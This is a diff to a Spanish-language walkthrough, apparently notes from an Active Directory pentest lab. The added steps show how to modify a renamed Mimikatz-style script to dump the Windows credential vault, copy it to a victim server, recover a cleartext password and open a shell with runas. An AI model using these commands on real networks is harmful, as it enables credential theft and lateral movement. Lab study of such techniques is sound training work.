@@ -293,5 +293,23 @@ Una vez copiado en la maquina victima nos vamos al directorio donde lo hemos cop
 Encontrando las credenciales de diferentes usuarios como *srvadmin*, *appadmin* y *websvc* en hash *aes256*
 
 También se pueden buscar credenciales en el almacén de credenciales de *Windows*
-Vamos a crear el nuevo *Invoke-TheKat* le llamaremos de la siguiente forma: *Invoke-TheKatEx-keys-std97.ps1*
+Vamos a crear el nuevo *Invoke-TheKat* le llamaremos de la siguiente forma: *Invoke-TheKatEx-vault-std97.ps1*
 Primero tendremos que crear una copia del  *Invoke-TheKat* original y cambiarle el nombre a *Invoke-TheKatEx-vault-std97.ps1*
+Tendremos que modificar el archivo y añadir en la ultima linea
+```shell
+Invoke-TheKat -Command '"token::evasive-elevate" "vault::cred /patch"'
+```
+
+Lo volvemos a copiar en la maquina victima y lo ejejcutamos
+```shell
+Copy-Item C:\AD\Tools\Invoke-MimiEX-vault-std97.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
+```
+
+Obteniendo como respuesta la contraseña en texto claro del usuario *srvadmin::TheKeyUs3ron@anyMachine!*
+
+Ahora nos ejecutaremos una shell como este usuario
+```shell
+runas /user:dcorp\srvadmin /netonly cmd
+```
+
+Obteniendo una shell como este usuario
